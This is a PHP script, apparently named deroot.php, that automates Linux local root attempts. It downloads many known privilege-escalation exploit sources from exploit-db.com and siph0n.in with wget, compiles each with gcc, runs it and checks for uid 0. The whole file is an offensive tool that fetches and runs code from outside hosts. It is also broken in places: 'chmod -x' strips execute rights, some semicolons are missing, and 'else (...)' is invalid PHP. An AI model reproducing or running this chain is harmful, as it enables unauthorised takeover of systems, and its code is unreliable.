<?php

# local root exploits from 2002-2015
print "___                          __
__| _/___________  ____   _____/  |_
/ __ |/ __ \_  __ \/  _ \ /  _ \   __\
/ /_/ \  ___/|  | \(  <_> |  <_> )  |
\____ |\___  >__|   \____/ \____/|__|
 \/    \/";
 print "Usage: php deroot.php\n";
 $kernel = system("uname -a");

 print "kernel info: $kernel\n";
 sleep(5);
 print "Ubuntu 12.04, 14.04, 14.10, 15.04 - overlayfs Local Root (Shell)\n";
 system("wget https://www.exploit-db.com/download/37292\n");
 system("mv 37292 37292.c\n");
 system("gcc 37292.c -o ofs\n");
 system("chmod -x ofs\n");
 system("./ofs\n");
 sleep(2);
print "Apport/Abrt - Local Root Exploit\n";
 sleep(2);
 system("wget https://www.exploit-db.com/download/36746\n");
 system("mv 36746 36746.c\n");
 system("gcc 36746.c -o apport\n");
 system("chmod -x apport\n");
 system("./apport");
 system("id");
 if  (posix_getuid() == 0){
   print "you are root";
 }
 else {
   print "Fail";
 }
 sleep(2);
 print "2001 local exploit\n";
 system("wget http://siph0n.in/dumps/local_exploits/2001/hudo.c\n");
 system("gcc hudo.c -o hudo\n");
 system("chmod -x hudo");
 system("./hudo");
 if (posix_getuid() == 0) {
   print "you are root\n";
 }
 else (posix_getuid() !== 0) {
   print "you are not root\n";
 }
print "------------------\n";
sleep(2);
print "2002 DHCP-exploit\n";
system("wget http://siph0n.in/dumps/local_exploits/2002/dhcp-expl.c\n");
system("gcc dhcp-expl.c -o dhcp\n")
system("chmod -x dhcp\n");
system("./dhcp");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "---------------------\n";

print "2003 hatorihanzo.c";
system("wget http://siph0n.in/dumps/local_exploits/2003/hatorihanzo.c\n");
system("gcc hatorihanzo.c -o hatori\n");
system("chmod -x hatori\n");
system("./hatori");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "-------------------\n";
sleep(2);
print "2003 ptrace-kmod.c";
system("wget http://siph0n.in/dumps/local_exploits/2003/ptrace-kmod.c\n");
system("gcc ptrace-kmod.c -o ptrace\n")
system("chmod -x ptrace\n");
system("./ptrace\n");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "--------------\n";
print "2004 hping.c\n";
system("wget http://siph0n.in/dumps/local_exploits/2004/hping.c\n");
system("gcc hping.c -o hping\n");
system("chmod -x hping\n");
system("./hping\n");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "---------------\n";
print "2004 kernel.c\n";
system("wget http://siph0n.in/dumps/local_exploits/2004/kernel.c\n");
system("gcc kernel.c -o kernel\n");
system("chmod -x kernel\n");
system("./kernel\n");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "------------\n";
print "2004 mremap.c\n";
system("wget http://siph0n.in/dumps/local_exploits/2004/mremap_pte.c\n");
system("gcc mremap_pte.c -o mremap");
system("chmod -x mremap");
system("./mremap");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "----------------\n";
print "2005 expand_stack SMP race local root exploit\n";
system("wget http://siph0n.in/dumps/local_exploits/2005/1.c\n");
system("gcc 1.c -o a\n");
system("chmod -x a\n");
system("./a\n");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "-----------\n";
print "ecl-nf-snmpwn.c\n";
system("wget http://siph0n.in/dumps/local_exploits/2006/2.c\n");
system("gcc 2.c -o b\n");
system("chmod -x b\n");
system("./b\n");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "--------------\n";
print "2006 prct2.c";
system("wget http://siph0n.in/dumps/local_exploits/2006/prct2.c\n");
system("gcc prct2.c -o prct\n");
system("chmod -x prct\n");
system("./prct\n");
if (posix_getuid() == 0) {
  print "you are root\n";
}
else (posix_getuid() !== 0) {
  print "you are not root\n";
}
print "----------------\n";



?>
